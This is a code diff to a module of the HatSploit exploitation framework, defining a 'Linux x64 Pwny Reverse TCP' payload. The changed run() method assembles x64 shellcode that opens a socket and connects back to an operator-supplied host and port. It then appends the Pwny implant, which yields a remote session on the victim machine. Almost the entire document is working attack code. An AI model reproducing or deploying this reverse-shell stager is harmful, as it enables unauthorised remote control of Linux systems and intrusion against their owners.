@@ -23,15 +23,19 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
                 'Ivan Nikolsky (enty8080) - payload developer'
             ],
             'Description': "Linux x64 Pwny Reverse TCP",
-            'Architecture': "x64",
+            'Arch': "x64",
             'Platform': "linux",
             'Session': PwnySession,
             'Rank': "high",
             'Type': "reverse_tcp"
         }
 
-    def phase(self):
-        implant = self.implant()
+    def implant(self):
+        implant = self.get_implant(
+            platform=self.details['Platform'],
+            arch=self.details['Arch']
+        )
+
         length = len(implant)
         e_entry = self.get_header(implant)['e_entry']
 
@@ -84,14 +88,31 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
             """
         )
 
-    def implant(self):
-        return self.get_implant(
-            self.details['Platform'],
-            self.details['Architecture']
-        )
-
     def run(self):
-        return self.get_pwny(
-            self.details['Platform'],
-            self.details['Architecture'],
-        )
+        host = self.pack_host(self.rhost.value)
+        port = self.pack_port(self.rport.value)
+
+        return self.assemble(
+            self.details['Arch'],
+            f"""
+            start:
+                push 0x29
+                pop rax
+                cdq
+                push 0x2
+                pop rdi
+                push 0x1
+                pop rsi
+                syscall
+
+                xchg rdi, rax
+                movabs rcx, 0x{host.hex()}{port.hex()}0002
+                push rcx
+                mov rsi, rsp
+                push 0x10
+                pop rdx
+                push 0x2a
+                pop rax
+                syscall
+            """
+        ) + self.implant()
